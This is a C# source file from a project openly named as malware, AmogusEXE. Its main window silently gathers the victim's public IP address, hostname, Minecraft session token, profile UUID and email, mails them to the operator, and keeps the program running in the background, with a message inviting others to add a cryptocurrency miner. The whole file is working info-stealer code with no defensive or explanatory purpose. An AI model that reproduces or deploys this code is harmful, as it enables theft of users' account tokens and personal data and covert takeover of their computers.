using System.Collections.Generic;
using System.Windows;
using AmogusEXE.Malware.Sender;
using AmogusEXE.Malware.Encoding;
using AmogusEXE.Malware.Reader;
using AmogusEXE.Malware.Minecraft;
using System.IO;
using System.Net;

namespace AmogusEXE
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            GetNecessaryStuff();
            InitializeComponent();
            new ForeverWindow();
            Close();
        }

        public static void GetNecessaryStuff()
        {
            var request = WebRequest.Create("http://checkip.dyndns.org");
            request.Method = "GET";
            using var webResponse = request.GetResponse();
            using var webStream = webResponse.GetResponseStream();
            using var reader = new StreamReader(webStream);
            string data = reader.ReadToEnd();
            string[] response = data.Split(':');
            string ip = response[1].Replace("</body></html>\r\n", "").Replace(" ", "");
            SortedDictionary<string, string> dict = ProcessSpoofer.GetMinecraft();
            string token = "<minecraft not found>";
            string profileID = "<minecraft not found>";
            string email = "<not found>";
            if (dict != null)
            {
                token = dict["token"];
                profileID = dict["profileID"];
                email = dict["email"];
            }

            Sender.Mail($"\"AmogusEXE was initialized on victim's PC!\nUser's IPv4 Address: {ip}\nUser's DNS Name: {Dns.GetHostName()}\n" +
                        $"Latest Minecraft session ID token: {token}\n" +
                        $"Minecraft profile UUID: {profileID}\n" +
                        $"Possible victim's email: {email}" +
                        "\n \nAmogus.EXE currently runs in background and can be used as miner or whatever, just download source code and add your miner there.\"");
        }
    }
}